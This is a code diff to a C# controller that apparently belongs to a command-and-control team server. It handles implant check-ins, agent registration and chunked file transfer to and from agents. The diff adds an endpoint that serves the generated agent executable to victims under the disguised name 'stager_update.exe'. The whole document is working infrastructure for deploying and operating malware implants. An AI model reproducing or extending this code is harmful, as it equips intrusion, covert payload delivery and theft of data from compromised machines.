@@ -17,11 +17,15 @@ namespace TeamServer.Models
     {
         private IAgentService _agentService;
         private IFileService _fileService;
+        private IListenerService _listenerService;
+        private IBinMakerService _binMakerService;
 
-        public HttpListenerController(IAgentService agentService, IFileService fileService)
+        public HttpListenerController(IAgentService agentService, IFileService fileService, IListenerService listenerService, IBinMakerService binMakerService)
         {
             this._agentService=agentService;
             this._fileService = fileService;
+            this._listenerService = listenerService;
+            this._binMakerService = binMakerService;
         }
 
         public async Task<IActionResult> HandleImplant()
@@ -31,7 +35,7 @@ namespace TeamServer.Models
                 return NotFound();
 
             var agent = this._agentService.GetAgent(metadata.Id);
-            if(agent == null)
+            if (agent == null)
             {
                 agent = new Agent(metadata);
                 this._agentService.AddAgent(agent);
@@ -40,7 +44,7 @@ namespace TeamServer.Models
             agent.CheckIn();
             agent.Metadata.AvailableCommands = metadata.AvailableCommands;
 
-            if(HttpContext.Request.Method == "POST")
+            if (HttpContext.Request.Method == "POST")
             {
                 string json;
                 using (var sr = new StreamReader(HttpContext.Request.Body))
@@ -76,6 +80,7 @@ namespace TeamServer.Models
             return JsonConvert.DeserializeObject<AgentMetadata>(json);
         }
 
+        #region Download
         public IActionResult SetupDownload(string filename)
         {
             var decoded = System.Web.HttpUtility.UrlDecode(filename);
@@ -115,6 +120,7 @@ namespace TeamServer.Models
                 Index = chunck.Index,
             });
         }
+        #endregion
 
         #region Upload
         public IActionResult SetupUpload([FromBody] FileDescriptor desc)
@@ -137,7 +143,7 @@ namespace TeamServer.Models
                 return NotFound();
 
             desc.Chunks.Add(chunk);
-            if(desc.IsUploaded)
+            if (desc.IsUploaded)
             {
                 var fileName = _fileService.GetAgentPath(metadata.Id, desc.Name);
                 _fileService.SaveUploadedFile(desc, fileName);
@@ -148,5 +154,35 @@ namespace TeamServer.Models
             return Ok();
         }
         #endregion
+
+        public IActionResult DownloadStager()
+        {
+            Listener currentListener = null;
+            foreach (var listener in _listenerService.GetListeners())
+            {
+                if (this.Request.Host.Host == listener.Ip && this.Request.Host.Port == listener.BindPort)
+                {
+                    currentListener = listener;
+                    break;
+                }
+            }
+
+            if (currentListener == null)
+                return NotFound("No corresponding Listener");
+
+            var path = this._fileService.GetListenerPath(currentListener.Name);
+            var fileName = Path.Combine(path, this._binMakerService.GeneratedAgentExeFileName);
+            if (!System.IO.File.Exists(fileName))
+                return NotFound();
+
+            byte[] fileBytes = null;
+            using (FileStream fs = System.IO.File.OpenRead(fileName))
+            {
+                fileBytes = new byte[fs.Length];
+                fs.Read(fileBytes, 0, (int)fs.Length);
+            }
+
+            return File(fileBytes, "application/octet-stream", "stager_update.exe");
+        }
     }
 }
